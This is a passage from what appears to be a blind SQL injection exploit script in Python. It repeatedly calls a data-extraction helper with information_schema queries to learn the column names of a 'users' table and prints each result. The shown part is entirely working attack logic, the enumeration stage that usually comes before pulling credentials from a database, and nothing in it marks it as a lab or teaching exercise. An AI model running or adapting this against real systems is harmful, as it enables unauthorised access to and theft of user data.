first_col = extract_data("SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1", CHARSET_EXT, 20)
print(f"[*] First column: {first_col}")

# Get second column name
second_col = extract_data("SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,1", CHARSET_EXT, 20)
print(f"[*] Second column: {second_col}")

# Get third column name
third_col = extract_data("SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 2,1", CHARSET_EXT, 20)
print(f"[*] Third column: {third_col}")

# Get fourth column name
fourth_col = extract_data("SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 3,1", CHARSET_EXT, 20)
print(f"[*] Fourth column: {fourth_col}")

print("\n[*] Summary of columns found:")
print(f"  1. {first_col}")
